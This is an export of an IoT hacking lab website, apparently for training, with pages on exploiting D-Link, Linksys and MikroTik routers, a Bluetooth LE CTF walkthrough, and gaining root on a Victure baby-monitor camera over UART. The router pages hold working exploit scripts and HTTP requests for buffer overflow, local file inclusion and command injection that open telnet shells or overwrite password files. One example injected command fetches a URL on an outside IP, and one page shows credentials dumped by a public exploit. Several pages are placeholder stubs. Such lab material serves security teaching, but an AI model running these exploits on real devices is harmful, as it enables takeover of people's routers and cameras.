[{"uri":"https://iot-hack-labs.github.io/victure-pc420/","title":"Victure PC420","tags":[],"description":"","content":"Victure PC420 Baby Monitor Requirements  Victure PC420 baby monitor camera with power cord USB to TTL adapter (Shikra, DSD Tech USB to TTL, etc.) Micro SD (at least 20 MB) Micro SD to USB adapter 3 Female to male jumper wires Computer  "},{"uri":"https://iot-hack-labs.github.io/router-lab/","title":"Router Lab","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/dir-815/auth-buffer-overflow/","title":"Auth Buffer Overflow","tags":[],"description":"","content":"Auth Buffer Overflow import urllib import urllib2 # This exploits the auth_main.cgi with read buffer overflow exploit for v2.02 # prequisite is just to have id and password fields in params url = \u0026#39;http://192.168.0.1/authentication.cgi\u0026#39; junk = \u0026#34;A\u0026#34;*1004+\u0026#34;B\u0026#34;*37+\u0026#34;\\x58\\xf8\\x40\\x00\u0026#34; # address of system function in executable junk+=\u0026#34;X\u0026#34;*164+\u0026#39;echo \u0026#34;Admin\u0026#34; \u0026#34;Admin\u0026#34; \u0026#34;0\u0026#34; \u0026gt; /var/passwd\\x00\u0026#39;+\u0026#34;AAAA\u0026#34; values = \u0026#34;id=test\u0026amp;password=test\u0026amp;test=\u0026#34;+junk req = urllib2.Request(url, values) response = urllib2.urlopen(req) the_page = response.read() "},{"uri":"https://iot-hack-labs.github.io/btle-ctf/","title":"BTLE CTF","tags":[],"description":"","content":"BTLE CTF About This lab walks through some tools that are used for hacking Bluetooth Low Energy (BLE). Our target is a Bluetooth CTF project designed to allow users to learn about core concepts of Bluetooth client and server interactions. (BLE CTF Infinity)\nTips for this lab ⚠️⚠️⚠️ BLE devices are finicky. Here are some helpful tips for this lab:\n Run commands multiple times if you get errors. Remove and re insert the Bluetooth dongle. Most of the time you can skip ahead in the lab if it just isn\u0026rsquo;t working.  "},{"uri":"https://iot-hack-labs.github.io/router-lab/dir-655/","title":"DIR-655","tags":[],"description":"","content":"DIR-655 \u0026hellip;\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/dir-815/","title":"DIR-815","tags":[],"description":"","content":"DIR-815 \u0026hellip;\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/mikrotik/01-discovery/","title":"Discovery","tags":[],"description":"","content":"Discovery This requires the attacker discover that port 8291 is exposed and running the Winbox service. (Not in the default nmap scan port list)\nOnly ports 8291, 21 are open.\nnmap 172.21.0.4 -p21,22,23,53,80,2000,8291 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 13:20 MDT Nmap scan report for 172.21.0.4 Host is up (0.0047s latency). PORT STATE SERVICE 21/tcp open ftp 22/tcp filtered ssh 23/tcp filtered telnet 53/tcp filtered domain 80/tcp filtered http 2000/tcp filtered cisco-sccp 8291/tcp open unknown The router version can be found by running nmap with service discovery.\n$ nmap 172.21.0.4 -p21,8291 -sC PORT STATE SERVICE 21/tcp open ftp | ftp-syst: |_ SYST: UNIX MikroTik 6.39.2 8291/tcp open unknown "},{"uri":"https://iot-hack-labs.github.io/btle-ctf/01-getting-started/","title":"Getting Started","tags":[],"description":"","content":"Devices Because it may be difficult to scan for all Bluetooth devices in such a crowded area, the BLE_CTF_INFINITY MAC addresses are provided below. If you are at a provided lab machine, try use the same number as your lab number. 1-5.\n 08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56  Tools We can use a few different tools to solve some BLE CTF Infinity challenges.\n hciconfig bleah gatttool  Hciconfig You can view BLE interfaces on you system by using the hciconfig command. You should see at least one interface.\nGatttool We use gatttool to write flags and to navigate to the different challenges. We can write 0000 to handle 0x0030 go to scoreboard at any time. This is also where flag 0 is.\n$ gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0000 When navigating to different challenges, you will probably get the following error:\nCharacteristic Write Request failed: Request attribute has encountered an unlikely error This is unavoidable because of the way the CTF was architected.\nBleah Although actually deprecated in favor of Bettercap, it may be easier to use bleah to target which device to enumerate characteristics.\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/wrt160n/local-file-inclusion/","title":"Local File Inclusion","tags":[],"description":"","content":"Local File Inclusion Make an HTTP POST request to the router like the following:\nPOST /apply.cgi HTTP/1.1 Host: {TARGET_IP} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Proxy-Connection: keep-alive Authorization: Basic {BASE_64_CREDENTIALS} Content-Type: application/x-www-form-urlencoded Content-Length: 181 Connection: close submit_type=wsc_method2\u0026amp;change_action=gozila_cgi\u0026amp;next_page=../..{FILE} NOTE: Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {FILE_TO_READ} with the valid IP, credentials, and file to read respectively\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/mikrotik/","title":"MikroTik","tags":[],"description":"","content":"Mikrotik (Router OS 6.39.2) Only ports 8291 and 21 are exposed. This means that in order for any admins to do maintenance, they must use the Winbox client which you can download from here: https://mikrotik.com/download(Windows only) Needs username and password.\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/dir-655/os-command-injection/","title":"OS Command Injection","tags":[],"description":"","content":"OS Command Injection Make an HTTP POST request to the router, replacing \u0026ldquo;{URL_ENCODED_CMD}\u0026rdquo; with the desired command to run on the router like wget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)\nPOST /apply_sec.cgi HTTP/1.1 Host: 192.168.232.128 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 131 Connection: close Referer: http://192.168.232.128/login_pic.asp Cookie: uid=1234123 Upgrade-Insecure-Requests: 1 html_response_page=login_pic.asp\u0026amp;action=ping_test\u0026amp;ping_ipaddr=127.0.0.1%0a{URL_ENCODED_CMD} "},{"uri":"https://iot-hack-labs.github.io/router-lab/wrt160n/os-command-injection/","title":"OS Command Injection","tags":[],"description":"","content":"OS Command Injection Make an HTTP POST request to the router like the following:\nPOST /apply.cgi HTTP/1.1 Host: {TARGET_IP} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Proxy-Connection: keep-alive Authorization: Basic {BASE_64_CREDENTIALS} Content-Type: application/x-www-form-urlencoded Content-Length: 181 Connection: close submit_button=Diagnostics\u0026amp;change_action=gozila_cgi\u0026amp;submit_type=start_ping\u0026amp;action=\u0026amp;commit=0\u0026amp;ping_ip=1.1.1.1\u0026amp;ping_size=|{URL_ENCODED_CMD}|\u0026amp;ping_times=5\u0026amp;traceroute_ip= NOTE: Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {URL_ENCODED_CMD} with the valid IP, credentials, and url encoded command respectively\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-i/","title":"OS Command Injection I","tags":[],"description":"","content":"OS Command Injection I import socket import struct # CSRF or any other trickery, but probably only works when connected to network I suppose buf = \u0026#34;POST /HNAP1/ HTTP/1.0\\r\\nHOST: 99.249.143.124\\r\\nUser-Agent: test\\r\\nContent-Length: 1\\r\\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX\u0026#34; + \u0026#39;;telnetd -p 9090;\\r\\n\u0026#39; + \u0026#34;1\\r\\n\\r\\n\u0026#34; print \u0026#34;[+] sending buffer size\u0026#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\u0026#34;192.168.0.1\u0026#34;, 80)) s.send(buf) or\nimport socket import struct # format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address) buf = \u0026#34;POST /HNAP1/ HTTP/1.0\\r\\nHOST: 192.168.1.8\\r\\nUser-Agent: test\\r\\nContent-Length: 1\\r\\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX\u0026#34; + \u0026#34;;sh;\u0026#34;+\u0026#34;H\u0026#34;*286 buf+= \u0026#34;\\x40\\xF4\\xB1\\x2A\u0026#34; # (ROP gadget which puts right value in A0) buf+= \u0026#34;B\u0026#34;*20+\u0026#34;ZZZZ\u0026#34;+\u0026#34;telnetd -p 6778\u0026#34;+\u0026#34;C\u0026#34;*5 # adjustment to get to the right payload buf+=\u0026#34;\\xA0\\xb2\\xb4\\x2a\u0026#34; # The system address is 2Ab4b200 so changing that in GDB just before jumping to test if it works which it does not buf+= \u0026#34;\\r\\n\u0026#34; + \u0026#34;1\\r\\n\\r\\n\u0026#34; print \u0026#34;[+] sending buffer size\u0026#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\u0026#34;1.2.3.4\u0026#34;, 80)) s.send(buf) "},{"uri":"https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-ii/","title":"OS Command Injection II","tags":[],"description":"","content":"OS Command Injection II import socket import struct # This vulnerability is pretty much in every router that has cgibin and uses SSDP code in that cgibin. This one worked on the device dir-815. Will work only in WLAN buf = \u0026#39;M-SEARCH * HTTP/1.1\\r\\nHOST:239.255.255.250:1900\\r\\nST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls\\r\\nMX:2\\r\\nMAN:\u0026#34;ssdp:discover\u0026#34;\\r\\n\\r\\n\u0026#39; print \u0026#34;[+] sending buffer size\u0026#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((\u0026#34;239.255.255.250\u0026#34;, 1900)) s.send(buf) s.close() "},{"uri":"https://iot-hack-labs.github.io/router-lab/dir-655/references/","title":"References","tags":[],"description":"","content":"References  https://www.zdnet.com/article/d-link-routers-contain-remote-code-execution-vulnerability/ https://www.fortinet.com  "},{"uri":"https://iot-hack-labs.github.io/router-lab/dir-815/references/","title":"References","tags":[],"description":"","content":"References  https://www.exploit-db.com/exploits/38721 https://www.exploit-db.com/exploits/38715  "},{"uri":"https://iot-hack-labs.github.io/router-lab/x150n/references/","title":"References","tags":[],"description":"","content":"References  https://www.akamai.com/content/dam/site/en/documents/research-paper/upnproxy-blackhat-proxies-via-nat-injections-white-paper.pdf  "},{"uri":"https://iot-hack-labs.github.io/router-lab/wrt160n/","title":"WRT160N","tags":[],"description":"","content":"WRT160N \u0026hellip;\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/x150n/","title":"X150N","tags":[],"description":"","content":"X150N \u0026hellip;\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/mikrotik/02-exploitation/","title":"Exploitation","tags":[],"description":"","content":"Exploitation The following versions of Router OS are vulnerable to \u0026ldquo;ByTheWay\u0026rdquo; exploit:\nLongterm: 6.30.1 - 6.40.7 Stable: 6.29 - 6.42 Beta: 6.29rc1 - 6.43rc3 The exploit can be found here, from Tenable team: https://github.com/tenable/routeros/tree/master/poc/bythewayThe attacker needs to clone the repo, and build the target. This requires downloading boost libs in Kali and some basic compilation. After that, the exploit should work out of the box, at least it will report the dumped creds.\n$ ./btw -i 172.21.0.4 ╔╗ ┬ ┬ ┌┬┐┬ ┬┌─┐ ╦ ╦┌─┐┬ ┬ ╠╩╗└┬┘ │ ├─┤├┤ ║║║├─┤└┬┘ ╚═╝ ┴ ┴ ┴ ┴└─┘ ╚╩╝┴ ┴ ┴ [+] Attempting to connect to 172.21.0.4:8291 [+] Extracting user.dat... [+] Searching for administrator credentials [+] Using credentials - admin:sHby8Gzi292ZsnS [+] Creating /pckg/option on 172.21.0.4:8291 [+] Creating /flash/nova/etc/devel-login on 172.21.0.4:8291 [+] There's a light on Telnet is blocked via firewall on the device though. Attackers will have the option to either use FTP. Probably the easier way to go. They can also download WinBox client from Mikrotik website. THis will give them access to the full portal. They can navigate to files and download flag.txt. Hopefully they don\u0026rsquo;t screw anything up.\n$ ftp 172.21.0.4 Connected to 172.21.0.4. 220 MikroTik FTP server (MikroTik 6.39.2) ready Name (172.21.0.4:msx): admin 331 Password required for admin Password: 230 User admin logged in Remote system type is UNIX. ftp\u0026gt; passive Passive mode on. ftp\u0026gt; ls 227 Entering Passive Mode (172,21,0,4,191,152). 150 Opening data connection -rw-rw---- 1 root root 59 Oct 18 12:47 flag.txt -rw-rw---- 1 root root 20070 Oct 17 20:40 test2.backup -rw-rw---- 1 root root 19762 Oct 17 20:28 test.backup drwxrwx--- 1 root root 1024 Dec 31 18:00 flash 226 Transfer complete ftp\u0026gt; get flag.txt local: flag.txt remote: flag.txt 227 Entering Passive Mode (172,21,0,4,208,214). 150 Opening ASCII mode data connection for /flag.txt (59 bytes) 226 ASCII transfer complete 59 bytes received in 0.00 secs (61.0999 kB/s) ftp\u0026gt; exit 221 Closing $ cat flag.txt I'm a flag... ------WebKitFormBoundarytbo3r6jM7GHBKTEs-- "},{"uri":"https://iot-hack-labs.github.io/btle-ctf/02-flag0/","title":"Flag0","tags":[],"description":"","content":"Here are the target devices for reference:\n 08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56  Use bleah to enumerate the characteristics on the device. (Remember to change the device MAC address)\n$ sudo bleah -b 94:B9:7E:FA:27:72 -e ⚠️ Try this a few times if it doesn\u0026rsquo;t work and/or removing and plugging in the bluetooth dongle.\nFor the flag 0, we notice that the \u0026lsquo;Device Name\u0026rsquo; kinda looks like a flag.\nSubmit the Flag Write the value to where we submit flags, handle 0x002e.\n$ gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x002e -n $(echo -n \u0026#34;04dc54d9053b4307680a\u0026#34; | xxd -ps) ⚠️ Try this until we get the message:\nCharacteristic value was written successfully Check Your Score Now let\u0026rsquo;s check the scoreboard again with bleah:\n$ sudo bleah -b 94:B9:7E:FA:27:72 -e We should see that Flag 0 is now complete.\n"},{"uri":"https://iot-hack-labs.github.io/router-lab/mikrotik/03-notes/","title":"Exploitation","tags":[],"description":"","content":"Additional Notes For this challenge, I actually manually extracted and placed the user.dat file so the challenge would be at an easier level. That being said, the attacker could test downloading different files and if they found an unencrypted backup, which was generated natively via configuring the router, they would have the same end result. Maybe a good challenge for next year.\n"},{"uri":"https://iot-hack-labs.github.io/btle-ctf/03-flag1/","title":"Flag1","tags":[],"description":"","content":"Here are the target devices for reference:\n 08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56  Navigate to Flag 1 Challenge Navigate to challenge 1 by writing 0x0001 to handle 0x0030\ngatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0001 ⚠️ Retry the command and/or replugging in the dongle until we get the following message:\nCharacteristic Write Request failed: Request attribute has encountered an unlikely error Use Bleah to Enumerate All Characteristics At this point, if we try to use bleah to enumerate the characteristics, we see that bleah shows us some interesting values.\n$ sudo bleah -b 94:B9:7E:FA:27:72 -e When enumerating, the value at handle 0x002a returns goodbye 👋. This disconnects the device. We have to use another tool to target reading the other values.\nUse Gatttool to Read Characteristics Read the value at 0x002c using gatttool.\n$ gatttool -b 94:B9:7E:FA:27:72 char-read -a 0x002c The value at 0x002c decoded looks like our flag :)\nSubmit the Flag Write the 873c6495e4e738c94e1c to handle 0x002e.\n$ gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x002e -n $(echo -n \u0026#34;873c6495e4e738c94e1c\u0026#34; | xxd -ps) ⚠️ Try this until we get the message:\nCharacteristic value was written successfully Check Your Score Navigate to the scoreboard (or you can just navigate to the next challenge).\n$ gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0000 ⚠️ Retry the command and/or replugging in the dongle until we get the following message:\nCharacteristic value was written successfully Use bleah to check the scoreboard.\n$ sudo bleah -b 94:B9:7E:FA:27:72 -e "},{"uri":"https://iot-hack-labs.github.io/btle-ctf/04-flag2/","title":"Flag2","tags":[],"description":"","content":"Here are the target devices for reference:\n 08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56  Navigate to Flag 2 Challenge Navigate to challenge 2 by writing 0x0002 to handle 0x0030\ngatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0002 ⚠️ Retry the command and/or replugging in the dongle until we get the following message:\nCharacteristic Write Request failed: Request attribute has encountered an unlikely error View Gatt Table After switching to challenge 2, use bleah to enumerate its characteristics again.\n$ sudo bleah -b 94:B9:7E:FA:27:72 -e We see that there is some authentication required, and that we should connect with pin 0000. We can do this with gatttool.\nUse Gatttool with Authentication $ gatttool --sec-level=high -b 94:B9:7E:FA:27:72 --char-read -a 0x002c This will prompt you for the pin. Enter 0000 and click OK.\nAfter authenticating, it will then print the value of 0x002c.\nUsing Cyberchefwe see\n35 64 36 39 36 63 64 66 35 33 61 39 31 36 63 30 61 39 38 64 decodes to\n5d696cdf53a916c0a98d Submit the Flag Submit the flag with gatttool.\n$ gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x002e -n $(echo -n \u0026#34;5d696cdf53a916c0a98d\u0026#34; | xxd -ps) ⚠️ Try this until we get the message:\nCharacteristic value was written successfully. Check Your Score Navigate to the scoreboard (or you can just navigate to the next challenge).\n$ gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0000 ⚠️ Retry the command and/or replugging in the dongle until we get the following message:\nCharacteristic value was written successfully Use bleah to check the scoreboard.\n$ sudo bleah -b 94:B9:7E:FA:27:72 -e "},{"uri":"https://iot-hack-labs.github.io/btle-ctf/05-flag3/","title":"Flag2","tags":[],"description":"","content":"Here are the target devices for reference:\n 08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56  Navigate to Flag 3 Challenge Navigate to challenge 3 by writing 0x0003 to handle 0x0030\ngatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0003 ⚠️ Retry the command and/or replugging in the dongle until we get the following message:\nCharacteristic Write Request failed: Request attribute has encountered an unlikely error View Gatt Table Use bleah to enumerate its characteristics again.\n$ sudo bleah -b 94:B9:7E:FA:27:72 -e We can see that it is looking for a device with the MAC address 11:22:33:44:55:66 to connect to it.\nView the Interface MAC Address Use hciconfig to view the MAC address of the interface.\nSpooftooph We can spoof our mac address with the tool spooftooph. (Make sure to use sudo)\n$ sudo spooftooph -i hci0 -a 11:22:33:44:55:66 Once we have done this, we need to reset the interface for the changes to take.\n$ sudo hciconfig hci0 reset Now hciconfig should show the new MAC.\nRead the Gatt Table with Spoofed MAC Using bettercap with the spoofed MAC we can now read the flag: 0ad3fe0c58e0a47b8afb.\nSubmit the Flag Submit the flag with gatttool.\n$ gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x002e -n $(echo -n \u0026#34;0ad3fe0c58e0a47b8afb\u0026#34; | xxd -ps) Characteristic value was written successfully Check Your Score Navigate to the scoreboard .\n$ gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0000 ⚠️ Retry the command and/or replugging in the dongle until we get the following message:\nCharacteristic value was written successfully Use bleah to check the scoreboard.\n$ sudo bleah -b 94:B9:7E:FA:27:72 -e "},{"uri":"https://iot-hack-labs.github.io/btle-ctf/99-outro/","title":"Finishing up","tags":[],"description":"","content":"Thats it for this lab. You are welcome to continue to try the other challenges. If you are done, reset the CTF by writing 0xC1EA12 to handle 0x0032.\n$ gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0032 -n C1EA12 References  https://github.com/hackgnar/ble_ctf_infinity Chapter 11 of Practical IoT Hackingfrom No Starch Press.  "},{"uri":"https://iot-hack-labs.github.io/victure-pc420/01-micro-sd/","title":"Micro SD","tags":[],"description":"","content":"Micro SD The micro SD must be FAT32 formatted. The following steps can be skipped if your micro SD is already FAT32 formatted.\nPartitioning When the micro SD card is plugged in, run the following to determine the micro SD\u0026rsquo;s block device on the computer\nkali@kali:~$ sudo fdisk -l Disk /dev/sda: 80 GiB, 85899345920 bytes, 167772160 sectors Disk model: VMware Virtual S Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x0852c5cd Device Boot Start End Sectors Size Id Type /dev/sda1 * 2048 165771263 165769216 79G 83 Linux /dev/sda2 165773310 167770111 1996802 975M 5 Extended /dev/sda5 165773312 167770111 1996800 975M 82 Linux swap / Solaris Disk /dev/sdb: 3.69 GiB, 3965714432 bytes, 7745536 sectors Disk model: Storage Device Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x29a1987d In this case, the block device for the micro SD is /dev/sdb\nWe will use fdisk to create a partition on the card.\nkali@kali:~$ sudo fdisk /dev/sdb Welcome to fdisk (util-linux 2.37.2). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): n Partition type p primary (0 primary, 0 extended, 4 free) e extended (container for logical partitions) Select (default p): [ENTER] Using default response p. Partition number (1-4, default 1): [ENTER] First sector (2048-7745535, default 2048): [ENTER] Last sector, +/-sectors or +/-size{K,M,G,T,P} (2048-7745535, default 7745535): [ENTER] Created a new partition 1 of type 'Linux' and of size 3.7 GiB. Command (m for help): w The partition table has been altered. Calling ioctl() to re-read partition table. Syncing disks. Where,\n Command (m for help): n: Adds a new partition Select (default p): [ENTER]: The default p is used. p will mark the partition as the primary partition First sector (2048-7745535, default 2048): [ENTER]: Sets the starting point of the partition at the default point. In this case, it is at the 2048 byte offset Last sector, +/-sectors or +/-size{K,M,G,T,P} (2048-7745535, default 7745535): [ENTER]: Sets the ending point of the partition at the default point. In this case, it is at the very end of the micro SD card Command (m for help): w: Writes the table to disk and exits  Running fdisk again will show the new partition on the card.\nkali@kali:~$ sudo fdisk /dev/sdb -l Disk /dev/sdb: 3.69 GiB, 3965714432 bytes, 7745536 sectors Disk model: Storage Device Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x29a1987d Device Boot Start End Sectors Size Id Type /dev/sdb1 2048 7745535 7743488 3.7G 83 Linux The new partition is located at /dev/sdb1 for this card.\nFormatting Now that the card is partitioned, it can be FAT32 formatted. To do that, simply run the following\nkali@kali:~$ sudo mkfs.fat /dev/sdb1 "},{"uri":"https://iot-hack-labs.github.io/victure-pc420/02-uart-to-uboot/","title":"UART to UBoot","tags":[],"description":"","content":"UART to U-Boot We will now connect to the Victure camera via the USB to TTL adapter.\nConnect the female ends of the jumper cables to the TX, RX, and GND pins on the USB to TTL adapter shown above. Once done, connect the adapter to the computer\nscreen can be used to connect to serial consoles. To connect to the adapter, run the following\nkali@kali:~$ screen /dev/ttyUSB0 115200 Where,\n /dev/ttyUSB0: Linux serial port for the USB to TTL adapter 115200: The baud rate (i.e. communication speed). 115200 is often the baud rate of UART devices.  Note: Your serial port might not be /dev/ttyUSB0. You can disconnect the adapter from the computer, run ls /dev, reconnect the adapter and run ls /dev to determine the correct serial port to use.\nNow connect the male ends of the jumper cables to the camera\u0026rsquo;s UART ports according to the following table\n   Adapter Camera     GND GND   TX RX   RX TX    It is now time to power the camera. Before doing so, make sure you are ready to press any key in the terminal where you ran the screen command to connect to the adapter\u0026rsquo;s serial console.\nOnce the camera is powered on, you should see something like this in the screen session\nU-Boot 2013.10.0-AK_V3.0.05 (Jan 11 2021 - 08:10:47) DRAM: 64 MiB 8 MiB Create flash partition table init OK! ak_sdhsmmc_init: ANYKA SDHC/MMC4.0: 0 Load Env CRC OK! In: serial Out: serial Err: serial reset pin value: 1 Hit any key to stop autoboot: 1 Press any key to stop the autoboot process. The following shell prompt should be shown\nanyka$ Note: If you weren\u0026rsquo;t fast enough, just simply disconnect and reconnect the power and try again.\n"},{"uri":"https://iot-hack-labs.github.io/victure-pc420/03-uboot-to-root/","title":"UBoot to Root","tags":[],"description":"","content":"U-Boot to Root The current shell is actually a U-Boot a limited shell. U-Boot is an open-source, primary boot loader. This shell has commands related to the booting process.\nanyka$ help ? - alias for 'help' base - print or set address offset bootm - boot application image from memory bootp - boot image via network using BOOTP/TFTP protocol chpart - change active partition cmp - memory compare cp - memory copy crc32 - checksum calculation downcheck_patition_update- load usr.sqsh4 tftp downimage- downimage - download and write All-Image to FLASH device,partiton table from ENV partition. downjffs2fs- load usr.jffs2 tftp downkernel- load uImage tftp ...\u0026lt;omitted for brevity\u0026gt;... This U-Boot shell can be used to drop us into a root shell. To do so, run the following\nanyka$ setenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M anyka$ saveenv Saving Environment to SPI Flash... Env save done OK Where,\n setenv bootargs args...: Sets the command line arguments that are passed to the kernel. The change here is init=/bin/sh. This means that instead of running /init when fully booted, /bin/sh will be run. saveenv: Saves the environment to Flash memory.  Now disconnect and reconnect the power to the camera. Once fully booted, you should be dropped into a shell.\n/ # ls -lah total 3 drwxrwxr-x 13 1024 1028 162 Mar 2 2021 . drwxrwxr-x 13 1024 1028 162 Mar 2 2021 .. drwxr-xr-x 2 1024 1028 2.3K Oct 28 2019 bin drwxr-xr-x 3 0 root 0 Jan 1 00:00 dev drwxr-xr-x 5 1024 1028 283 Mar 2 2021 etc -rwxr-xr-x 1 1024 1028 2.7K Nov 22 2017 init drwxr-xr-x 3 1024 1028 816 Feb 9 2021 lib drwxr-xr-x 2 1024 1028 3 Feb 9 2017 mnt drwxr-xr-x 2 1024 1028 3 Feb 9 2017 proc drwxr-xr-x 2 1024 1028 1.4K Mar 2 2021 sbin drwxr-xr-x 2 1024 1028 3 Feb 9 2017 sys drwxr-xr-x 2 1024 1028 3 Feb 9 2017 tmp drwxr-xr-x 2 1024 1028 3 Mar 2 2021 usr drwxr-xr-x 3 1024 1028 26 Apr 14 2017 var "},{"uri":"https://iot-hack-labs.github.io/victure-pc420/04-configure-remote-connection/","title":"Configure Remote Connection","tags":[],"description":"","content":"Configure Remote Connection We have successfully been dropped into a root shell on the camera, but this required physical access. We are next going to update the camera\u0026rsquo;s firmware to run telnetd upon booting up, allowing us to connect to it remotely.\nDump Firmware The first step in enabling remote connections is to dump the camera\u0026rsquo;s firmware.\nYou may notice that, though we have shell, basic commands like whoami seem to give errors\n/ # whoami whoami: unknown uid 0 This is because we bypassed the initialization scripts that would mount file systems and start and configure certain services.\nWe could simply run /init but the camera\u0026rsquo;s services all output to stdout which make it nearly impossible to use the shell. Thankfully, the services will log to a specific file if it exists when they are run.\nRun the following to ensure the services will only log to a file\n/ # mount /mnt \u0026amp;\u0026amp; mkdir /mnt/debug \u0026amp;\u0026amp; touch /mnt/debug/log.txt Where,\n mount /mnt: Mounts the /mnt directory according to the /etc/fstab file mkdir /mnt/debug \u0026amp;\u0026amp; touch /mnt/debug/log.txt: Creates the debug directory and the log file the services will log to  Now we can safely run the initialization scripts. The scripts output to the console then start executing services in the background, dropping you back in the shell\n/ # /etc/init.d/rcS mount all file system... mount: according to /proc/mounts, tmpfs is already mounted on /mnt starting mdev... ************************** Love Linux ! ! ! ************************** 200+0 records in 200+0 records out 102400 bytes (100.0KB) copied, 0.024803 seconds, 3.9MB/s find: insmod: No such file or directory aksensor_module_init aksensor 0-0001: Sensor ID error Running whoami shows us that the system has been initialized\n~ # whoami root Because we will be connecting remotely later on, lets update root\u0026rsquo;s password to something we know\n~ # passwd Changing password for root New password: Bad password: too short Retype password: Password for root changed by root Note: For the purpose of this guide, a simple password was used. It is advised to use a stronger password to avoid being easily compromised.\nConnect the micro SD card to the camera and run the following:\n~ # mount /dev/mmcblk0p1 /mnt ~ # mkdir /mnt/firmware ~ # cp /dev/mtdblock* /mnt/firmware/ Where,\n mount /dev/mmcblk0p1 /mnt: Mounts the micro SD card to /mnt cp /dev/mtdblock* /mnt/firmware/: Copies the block devices that contain the firmware over to the micro SD card  Modify firmware The block device that we need to modify is just a squashfs filesystem file. To extract the files from the firmware, lets install the squashfs tools\nsudo apt install squashfs-tools Now connect the micro SD to the computer and mount the card\nkali@kali:~$ sudo mkdir /mnt/pc420 kali@kali:~$ sudo mount /dev/sdb1 /mnt/pc420 Now run the following to unsquash the root filesystem:\nkali@kali:~$ unsquashfs -d rootfs /mnt/pc420/firmware/mtdblock4 Parallel unsquashfs: Using 6 processors 320 inodes (338 blocks) to write [===================-] 338/338 100% created 302 files created 17 directories created 18 symlinks created 0 devices created 0 fifos created 0 sockets Where,\n unsquashfs -d rootfs /mnt/pc420/firmware/mtdblock4: Unsquashes the mtdblock4 squashfs file and extracts the files to the rootfs directory  Now we are going to update the initialization scripts to start telnet and 